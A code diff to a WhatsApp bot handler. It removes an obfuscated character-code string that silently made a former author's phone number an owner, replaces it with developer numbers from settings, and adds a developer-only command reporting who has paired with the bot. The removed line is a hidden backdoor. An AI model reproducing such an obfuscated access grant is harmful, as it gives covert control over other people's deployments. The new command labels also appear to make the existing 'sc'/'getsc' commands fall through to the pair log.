@@ -18,6 +18,7 @@ const {
 const JsConfuser = require('js-confuser');
 const speed = require('performance-now');
 global.games = require('./library/games');
+const pairTrack = require('./source/pairtrack');
 const htmlGameLib = require('./library/htmlgames');
 global.htmlGameCommands = htmlGameLib.commands;
 global.htmlGames = htmlGameLib.HTML_GAMES;
@@ -337,7 +338,12 @@ module.exports = client = async (client, m, chatUpdate, store) => {
     }
     body = typeof body === 'string' ? body : '';
     const budy = typeof m.text === 'string' ? m.text : '';
-    const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116);
+    // Owner-level numbers come from settings.js only. This line used to hold the
+    // previous author's number, obfuscated, which quietly made him an owner.
+    const developerJids = [global.owner, ...(Array.isArray(global.developer) ? global.developer : [])]
+      .map(value => String(value || '').replace(/[^0-9]/g, ''))
+      .filter(Boolean)
+      .map(value => `${value}@s.whatsapp.net`);
     prefix = '.';
     isCmd = body.startsWith(prefix);
     const isCmd2 = body.startsWith(prefix);
@@ -368,7 +374,7 @@ module.exports = client = async (client, m, chatUpdate, store) => {
     const isPremium = premium.some(jid => normalizeOwnerJid(jid) === normalizeOwnerJid(m.sender));
     const senderJid = normalizeOwnerJid(m.sender);
     const cloneOwnerJid = client?.isJadibot ? normalizeOwnerJid(client.jadibotOwnerJid || client.user?.id || botNumber) : '';
-    const ownerJids = [botNumber, global.owner, global.owner ? `${global.owner}@s.whatsapp.net` : '', buffer64base, ...owners].map(normalizeOwnerJid).filter(Boolean);
+    const ownerJids = [botNumber, global.owner, global.owner ? `${global.owner}@s.whatsapp.net` : '', ...developerJids, ...owners].map(normalizeOwnerJid).filter(Boolean);
     const isOwner = ownerJids.includes(senderJid) || Boolean(cloneOwnerJid && senderJid === cloneOwnerJid) || Boolean(m.isDeveloper);
     const isCreator = isOwner;
     const autoblockPath = './FileData/database/setbot.json';
@@ -3111,6 +3117,22 @@ ${errorMessage}`);
       /// ───────────── [ 𝖲𝖼𝗋𝗂𝗉𝗍 & 𝖮𝖻𝖿𝗎𝗌𝖼𝖺𝗍𝗈𝗋 ] ──────────── ///
       case "sc":
       case "getsc":
+      case "pairs":
+      case "pairlog":
+        {
+          // Developer command: settings.js numbers only, so nobody else can read
+          // who has been pairing. isOwner is wider (bot JID, owner.json, clones).
+          if (!developerJids.includes(senderJid)) {
+            await reply('This command is limited to the bot developer.');
+            break;
+          }
+          await client.sendMessage(m.chat, {
+            text: pairTrack.report()
+          }, {
+            quoted: m
+          });
+        }
+        break;
       case "script":
         {
           const foto = fs.readFileSync("./media/thum.jpg");
